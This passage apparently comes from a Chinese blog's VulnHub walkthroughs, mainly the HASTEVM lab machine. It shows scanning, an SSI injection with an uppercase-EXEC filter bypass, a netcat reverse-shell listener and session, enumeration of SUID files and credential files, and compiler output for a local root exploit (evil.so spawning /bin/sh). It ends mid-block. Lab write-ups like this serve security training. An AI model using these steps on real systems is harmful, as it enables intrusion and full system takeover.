ls</span><br><span class="hljs-built_in">ls</span><br>root@ubuntu:~<span class="hljs-comment"># ls -alih</span><br><span class="hljs-built_in">ls</span> -alih<br>total 32K<br>   16 drwx------  4 root root 4.0K Apr 28  2017 .<br>    2 drwxr-xr-x 22 root root 4.0K Mar 17  2017 ..<br>11416 -rw-------  1 root root  505 May  2  2017 .bash_history<br>   17 -rw-r--r--  1 root root 3.1K Oct 22  2015 .bashrc<br>16439 drwx------  2 root root 4.0K Apr 28  2017 .cache<br>14287 -rw-------  1 root root  215 Apr 27  2017 .mysql_history<br>16385 drwxr-xr-x  2 root root 4.0K Mar 21  2017 .nano<br>   18 -rw-r--r--  1 root root  148 Aug 17  2015 .profile<br></code></pre></td></tr></table></figure><p>root 目录中没有 flag，结束战斗</p>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>HASTEVM 靶机</title>
    <link href="/2023/09/64870b3c7ab9.html"/>
    <url>/2023/09/64870b3c7ab9.html</url>
    
    <content type="html"><![CDATA[<h1 id="HASTEVM-靶机"><a href="#HASTEVM-靶机" class="headerlink" title="HASTEVM 靶机"></a>HASTEVM 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/HASTEVM]<br>└─$ sudo nmap --min-rate 10000 -p- 192.1.1.150           <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-12 09:28 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.150<br>Host is up (0.0023s latency).<br>Not shown: 65534 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>80/tcp open  http<br>MAC Address: 00:0C:29:B3:82:58 (VMware)<br></code></pre></td></tr></table></figure><p>TCP 扫描只有 80 端口开放，UDP 扫描结果</p><p><img src="/pic/dce6112d73b86a9f6357aadaadeac74c_MD5.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/HASTEVM]<br>└─$ sudo nmap -sT -sV -sC -O -p80 192.1.1.150             <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-12 09:39 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.150<br>Host is up (0.00035s latency).<br><br>PORT   STATE SERVICE VERSION<br>80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))<br>|_http-title: H.A.S.T.E<br>| http-robots.txt: 1 disallowed entry <br>|_/spukcab<br>|_http-server-header: Apache/2.4.18 (Ubuntu)<br>MAC Address: 00:0C:29:B3:82:58 (VMware)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 14.42 seconds<br></code></pre></td></tr></table></figure><p>发现了 <code>robots.txt</code> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/HASTEVM]<br>└─$ sudo nmap --script=vuln -p80 192.1.1.150             <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-12 09:39 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.150<br>Host is up (0.00028s latency).<br><br>PORT   STATE SERVICE<br>80/tcp open  http<br>|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)<br>| http-stored-xss: <br>|   Found the following stored XSS vulnerabilities: <br>|   <br>|      Payload: ghz&gt;hzx<br>|        Uploaded on: http://192.1.1.150:80/receipt.php<br>|_       Description: Unfiltered <span class="hljs-string">&#x27;&gt;&#x27;</span> (greater than sign). An indication of potential XSS vulnerability.<br>| http-slowloris-check: <br>|   VULNERABLE:<br>|   Slowloris DOS attack<br>|     State: LIKELY VULNERABLE<br>|     IDs:  CVE:CVE-2007-6750<br>|       Slowloris tries to keep many connections to the target web server open and hold<br>|       them open as long as possible.  It accomplishes this by opening connections to<br>|       the target web server and sending a partial request. By doing so, it starves<br>|       the http server<span class="hljs-string">&#x27;s resources causing Denial Of Service.</span><br><span class="hljs-string">|       </span><br><span class="hljs-string">|     Disclosure date: 2009-09-17</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span><br><span class="hljs-string">|_      http://ha.ckers.org/slowloris/</span><br><span class="hljs-string">|_http-phpself-xss: ERROR: Script execution failed (use -d to debug)</span><br><span class="hljs-string">| http-csrf: </span><br><span class="hljs-string">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.1.1.150</span><br><span class="hljs-string">|   Found the following possible CSRF vulnerabilities: </span><br><span class="hljs-string">|     </span><br><span class="hljs-string">|     Path: http://192.1.1.150:80/</span><br><span class="hljs-string">|     Form id: </span><br><span class="hljs-string">|     Form action: receipt.php</span><br><span class="hljs-string">|     </span><br><span class="hljs-string">|     Path: http://192.1.1.150:80/layout/scripts/jquery.mobilemenu.js</span><br><span class="hljs-string">|     Form id: </span><br><span class="hljs-string">|     Form action: #</span><br><span class="hljs-string">|     </span><br><span class="hljs-string">|     Path: http://192.1.1.150:80/index.php</span><br><span class="hljs-string">|     Form id: </span><br><span class="hljs-string">|_    Form action: receipt.php</span><br><span class="hljs-string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.<br>| http-fileupload-exploiter: <br>|   <br>|     Couldn<span class="hljs-string">&#x27;t find a file-type field.</span><br><span class="hljs-string">|   </span><br><span class="hljs-string">|_    Couldn&#x27;</span>t find a file-type field.<br>| http-enum: <br>|   /robots.txt: Robots file<br>|   /images/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.4.18 (ubuntu)&#x27;</span><br>|_  /pages/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.4.18 (ubuntu)&#x27;</span><br>MAC Address: 00:0C:29:B3:82:58 (VMware)<br></code></pre></td></tr></table></figure><p>发现了 robots.txt 和 images 以及 pages</p><h2 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/HASTEVM]<br>└─$ sudo gobuster <span class="hljs-built_in">dir</span> -u http://192.1.1.150/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x txt,html,sql,tar,php <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>===============================================================<br>Gobuster v3.5<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.1.1.150/<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.5<br>[+] Extensions:              sql,tar,php,txt,html<br>[+] Timeout:                 10s<br>===============================================================<br>2023/09/14 03:35:37 Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.php                 (Status: 403) [Size: 290]<br>/index                (Status: 200) [Size: 35]<br>/images               (Status: 301) [Size: 311] [--&gt; http://192.1.1.150/images/]<br>/index.php            (Status: 200) [Size: 6851]<br>/.html                (Status: 403) [Size: 291]<br>/pages                (Status: 301) [Size: 310] [--&gt; http://192.1.1.150/pages/]<br>/layout               (Status: 301) [Size: 311] [--&gt; http://192.1.1.150/layout/]<br>/robots               (Status: 200) [Size: 33]<br>/robots.txt           (Status: 200) [Size: 33]<br>/ssi                  (Status: 200) [Size: 579]<br>/licence.txt          (Status: 200) [Size: 5004]<br>/licence              (Status: 200) [Size: 5004]<br>/.html                (Status: 403) [Size: 291]<br>/.php                 (Status: 403) [Size: 290]<br>/server-status        (Status: 403) [Size: 299]<br>/logitech-quickcam_W0QQcatrefZC5QQfbdZ1QQfclZ3QQfposZ95112QQfromZR14QQfrppZ50QQfsclZ1QQfsooZ1QQfsopZ1QQfssZ0QQfstypeZ1QQftrtZ1QQftrvZ1QQftsZ2QQnojsprZyQQpfidZ0QQsaatcZ1QQsacatZQ2d1QQsacqyopZgeQQsacurZ0QQsadisZ200QQsaslopZ1QQsofocusZbsQQsorefinesearchZ1.html (Status: 403) [Size: 542]<br>/receipt              (Status: 200) [Size: 2588]<br>/receipt.php          (Status: 302) [Size: 1] [--&gt; receipt.shtml]<br>Progress: 7640310 / 7643004 (99.96%)<br>===============================================================<br>2023/09/14 04:00:35 Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>开始查看各个文件路径，index 是很奇怪的一串字符串，先记录下来</p><p><img src="/pic/2556f31420afcce63c939c1624facf5d_MD5.png"></p><p>images 中没啥东西</p><p><img src="/pic/60f784ab3b3845f52a77ba43b8343832_MD5.png"></p><p>pages 中也没啥东西</p><p><img src="/pic/35def0be1a68f57d89887de849906e32_MD5.png"></p><p>layout 中也没啥东西</p><p><img src="/pic/378497811bc06b6f8b39ea7ce0e2428a_MD5.png"></p><p><code>robots.txt</code> </p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">User-agent</span><span class="hljs-punctuation">: </span>*<br><span class="hljs-attribute">Disallow</span><span class="hljs-punctuation">: </span>/spukcab<br></code></pre></td></tr></table></figure><p>查看<code>/spukcab</code></p><p><img src="/pic/77018eda2998dc59f338ddc21759e3db_MD5.png"></p><p>文件下载到本地后，除了文件路径，没发现什么有价值的信息</p><p><img src="/pic/1fb422349f2bf69905a98f7e6c0f868b_MD5.png"></p><p>ssi 路径比较奇怪，搜索了一下相关信息，SSI 可能存在注入</p><p><a href="https://psychovik.medium.com/ssi-server-side-include-injection-8b69289aece7">SSI — Server Side Include Injection | by Vikas Sharma | Medium</a></p><p><a href="https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/08-Testing_for_SSI_Injection">WSTG - v4.1 | OWASP Foundation</a></p><h2 id="SSI-注入"><a href="#SSI-注入" class="headerlink" title="SSI 注入"></a>SSI 注入</h2><p>不过 SSI 还是需要有输入点的，根据上面的文章，猜测可能是默认界面中有个 form 框</p><p><img src="/pic/3f839067b7debef8ef57652df9c865df_MD5.png"></p><p>burp 抓包看看</p><p><img src="/pic/8fb6cfd7dc3817b05cdc785c5ee2666f_MD5.png"></p><p>发现了提交的内容会被返回，有可能是在这里被解析了</p><p>一开始尝试了上面文章中的 PoC，但是并没有达到满意的效果</p><p><img src="/pic/de40e1308ae4610bfb1a75f4a96aaeeb_MD5.png"></p><p>看了 WP 发现，原来这里的 PoC 需要把 exec 改成大写</p><blockquote><p>一种简单的绕过机制，一般这种服务器端命令都会被过滤，所以都需要有绕过思维，而大小写思维有比较常用</p></blockquote><p><img src="/pic/c36332a7eb04a6f84d0df07ad8457f53_MD5.png"></p><p>而且注入点是在 feedback</p><h2 id="反弹-shell"><a href="#反弹-shell" class="headerlink" title="反弹 shell"></a>反弹 shell</h2><p>ls 的结果证明了这是在网站根目录，接下来尝试反弹 shell，但是 nc, python, sh 反弹都失败了，那就只能把文件下载到网站根目录中，在浏览器中访问此 php 文件，反弹 shell 成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/HASTEVM]<br>└─$ sudo nc -lvnp 443                                    <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 443 ...<br>connect to [192.1.1.128] from (UNKNOWN) [192.1.1.150] 39338<br>Linux ConverterPlus 4.15.0-142-generic <span class="hljs-comment">#146~16.04.1-Ubuntu SMP Tue Apr 13 09:26:57 UTC 2021 i686 athlon i686 GNU/Linux</span><br> 02:03:33 up  1:00,  0 <span class="hljs-built_in">users</span>,  load average: 0.00, 0.00, 0.00<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>/bin/sh: 0: can\<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ whoami</span><br><span class="hljs-string">www-data</span><br><span class="hljs-string">$ id</span><br><span class="hljs-string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="hljs-string">$ ip a</span><br><span class="hljs-string">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="hljs-string">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="hljs-string">    inet 127.0.0.1/8 scope host lo</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">    inet6 ::1/128 scope host </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000</span><br><span class="hljs-string">    link/ether 00:0c:29:b3:82:58 brd ff:ff:ff:ff:ff:ff</span><br><span class="hljs-string">    inet 192.1.1.150/24 brd 192.1.1.255 scope global dynamic ens33</span><br><span class="hljs-string">       valid_lft 1546sec preferred_lft 1546sec</span><br><span class="hljs-string">    inet6 fe80::5600:6317:eab4:21f7/64 scope link </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">$ uname -a</span><br><span class="hljs-string">Linux ConverterPlus 4.15.0-142-generic #146~16.04.1-Ubuntu SMP Tue Apr 13 09:26:57 UTC 2021 i686 athlon i686 GNU/Linux</span><br><span class="hljs-string">$ python -c &quot;import pty;pty.spawn(&#x27;</span>/bin/bash<span class="hljs-string">&#x27;)&quot;</span><br><span class="hljs-string">www-data@ConverterPlus:/$ sudo -l</span><br><span class="hljs-string">sudo -l</span><br><span class="hljs-string">[sudo] password for www-data</span><br></code></pre></td></tr></table></figure><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>查看用户家目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@ConverterPlus:/home/starfire$ <span class="hljs-built_in">ls</span> -alih<br><span class="hljs-built_in">ls</span> -alih<br>total 124K<br>407181 drwxr-xr-x 17 starfire starfire 4.0K Sep 11  2017 .<br>393217 drwxr-xr-x  3 root     root     4.0K Sep  9  2017 ..<br>398369 -rw-------  1 starfire starfire  692 Sep 11  2017 .ICEauthority<br>393246 -rw-------  1 starfire starfire   58 Sep 11  2017 .Xauthority<br>393335 -rw-------  1 starfire starfire 9.3K Sep 11  2017 .bash_history<br>408224 -rw-r--r--  1 starfire starfire  220 Sep  9  2017 .bash_logout<br>408222 -rw-r--r--  1 starfire starfire 3.7K Sep  9  2017 .bashrc<br>393237 drwx------ 11 starfire starfire 4.0K Sep 11  2017 .cache<br>393322 drwx------ 14 starfire starfire 4.0K Sep  9  2017 .config<br>393240 -rw-r--r--  1 starfire starfire   25 Sep  9  2017 .dmrc<br>398371 drwx------  2 starfire starfire 4.0K Sep  9  2017 .gconf<br>393359 drwx------  3 starfire starfire 4.0K Sep 11  2017 .gnupg<br>393331 drwx------  3 starfire starfire 4.0K Sep  9  2017 .<span class="hljs-built_in">local</span><br>549568 drwx------  4 starfire starfire 4.0K Sep 11  2017 .mozilla<br>548637 drwxrwxr-x  2 starfire starfire 4.0K Sep 10  2017 .nano<br>408223 -rw-r--r--  1 starfire starfire  655 Sep  9  2017 .profile<br>398482 -rw-r--r--  1 starfire starfire    0 Sep  9  2017 .sudo_as_admin_successful<br>393432 -rw-------  1 starfire starfire 1.4K Sep 11  2017 .xsession-errors<br>393247 -rw-------  1 starfire starfire 1.5K Sep 11  2017 .xsession-errors.old<br>393260 drwxr-xr-x  2 starfire starfire 4.0K Sep  9  2017 Desktop<br>393318 drwxr-xr-x  2 starfire starfire 4.0K Sep  9  2017 Documents<br>393308 drwxr-xr-x  2 starfire starfire 4.0K Sep  9  2017 Downloads<br>393319 drwxr-xr-x  2 starfire starfire 4.0K Sep  9  2017 Music<br>393320 drwxr-xr-x  2 starfire starfire 4.0K Sep  9  2017 Pictures<br>393317 drwxr-xr-x  2 starfire starfire 4.0K Sep  9  2017 Public<br>393316 drwxr-xr-x  2 starfire starfire 4.0K Sep  9  2017 Templates<br>393321 drwxr-xr-x  2 starfire starfire 4.0K Sep  9  2017 Videos<br>407182 -rw-r--r--  1 starfire starfire 8.8K Sep  9  2017 examples.desktop<br></code></pre></td></tr></table></figure><p>其中的各个文件夹都打开看了看，没有收获，看一看 SUID 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@ConverterPlus:/home/starfire$ find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>&lt;e/starfire$ find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null                     <br>   131128     32 -rwsr-xr-x   1 root     root        30112 Jul 12  2016 /bin/fusermount<br>   131203     44 -rwsr-xr-x   1 root     root        43316 May  7  2014 /bin/ping6<br>   131249     28 -rwsr-xr-x   1 root     root        26492 Jun 14  2017 /bin/umount<br>   131202     40 -rwsr-xr-x   1 root     root        38932 May  7  2014 /bin/ping<br>   131229     40 -rwsr-xr-x   1 root     root        38900 May 16  2017 /bin/su<br>   131165     36 -rwsr-xr-x   1 root     root        34812 Jun 14  2017 /bin/mount<br>   263148     36 -rwsr-xr-x   1 root     root        34680 May 16  2017 /usr/bin/newgrp<br>   266140     12 -rwsr-xr-x   1 root     root         9808 Feb  9  2017 /usr/bin/vmware-user-suid-wrapper<br>   263617    160 -rwsr-xr-x   1 root     root       159852 Jan 20  2021 /usr/bin/sudo<br>   262396     40 -rwsr-xr-x   1 root     root        39560 May 16  2017 /usr/bin/chsh<br>   263211     52 -rwsr-xr-x   1 root     root        53128 May 16  2017 /usr/bin/passwd<br>   273342     20 -rwsr-xr-x   1 root     root        18216 Mar 27  2019 /usr/bin/pkexec<br>   262394     48 -rwsr-xr-x   1 root     root        48264 May 16  2017 /usr/bin/chfn<br>   262716     80 -rwsr-xr-x   1 root     root        78012 May 16  2017 /usr/bin/gpasswd<br>   263160    388 -rwsr-xr--   1 root     dip        396068 Jul 23  2020 /usr/sbin/pppd<br>   273254    504 -rwsr-xr-x   1 root     root       513528 Mar  4  2019 /usr/lib/openssh/ssh-keysign<br>   266928      8 -rwsr-xr-x   1 root     root         5480 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device<br>   271337     16 -rwsr-xr-x   1 root     root        13840 Mar 17  2017 /usr/lib/i386-linux-gnu/oxide-qt/chrome-sandbox<br>   268960     16 -rwsr-xr-x   1 root     root        13960 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1<br>   264433     48 -rwsr-xr--   1 root     messagebus    46436 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>   262623     12 -rwsr-sr-x   1 root     root           9772 Apr  8  2021 /usr/lib/xorg/Xorg.wrap<br>   272845    120 -rwsr-xr-x   1 root     root         121420 Feb  7  2021 /usr/lib/snapd/snap-confine<br></code></pre></td></tr></table></figure><p>SUID 文件没惊喜，看定时任务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@ConverterPlus:/tmp$ <span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-comment"># /etc/crontab: system-wide crontab</span><br><span class="hljs-comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span><br><span class="hljs-comment"># command to install the new version when you edit this file</span><br><span class="hljs-comment"># and files in /etc/cron.d. These files also have username fields,</span><br><span class="hljs-comment"># that none of the other crontabs do.</span><br><br>SHELL=/bin/sh<br>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br><br><span class="hljs-comment"># m h dom mon dow user  command</span><br>17 *    * * *   root    <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6    * * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6    * * 7   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6    1 * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )<br></code></pre></td></tr></table></figure><p>看敏感文件的的权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@ConverterPlus:/tmp$ <span class="hljs-built_in">ls</span> -alih /etc/passwd /etc/shadow /etc/crontab<br><span class="hljs-built_in">ls</span> -alih /etc/passwd /etc/shadow /etc/crontab<br>786579 -rw-r--r-- 1 root root    722 Apr  5  2016 /etc/crontab<br>812110 -rw-r--r-- 1 root root   2.2K Sep  9  2017 /etc/passwd<br>809674 -rw-r----- 1 root shadow 1.3K Sep 11  2017 /etc/shadow<br></code></pre></td></tr></table></figure><p>到这里一直没收获</p><h2 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h2><p>尝试内核提权</p><p><img src="/pic/bd9a9dc1c72cffd7c472f8c2a93a5e2b_MD5.png"></p><p>尝试了这两个，都失败了，那就只能用 linpeas 收集一下</p><p><img src="/pic/f59c51f4ff404d399a3c9a178c651248_MD5.png"></p><p>根据 CVE 搜索 exp</p><p><img src="/pic/4b6b7f687d6e7a5000c79f0474564b15_MD5.png"></p><p>将三个文件依次下载到靶机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@ConverterPlus:/tmp$ make<br>make<br>gcc -shared -o evil.so -fPIC evil-so.c<br>evil-so.c: In <span class="hljs-keyword">function</span> <span class="hljs-string">&#x27;gconv_init&#x27;</span>:<br>evil-so.c:10:5: warning: implicit declaration of <span class="hljs-keyword">function</span> <span class="hljs-string">&#x27;setgroups&#x27;</span> [-Wimplicit-function-declaration]<br>     setgroups(0);<br>     ^<br>evil-so.c:12:5: warning: null argument <span class="hljs-built_in">where</span> non-null required (argument 2) [-Wnonnull]<br>     execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, NULL, NULL);<br>     ^<br>gcc exploit.c -o exploit<br>exploit.c: In <span class="hljs-keyword">function</span> <span class="hljs-string">&#x27;main&#x27;</span>:<br>exploit.c:25:5: warning: implicit declaration of <span class="hljs-keyword">function</span> <span class="hljs-string">&#x27;execve&#x27;</span> [-Wimplicit-function-declaration]<br>     execve(BIN, argv, envp);<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 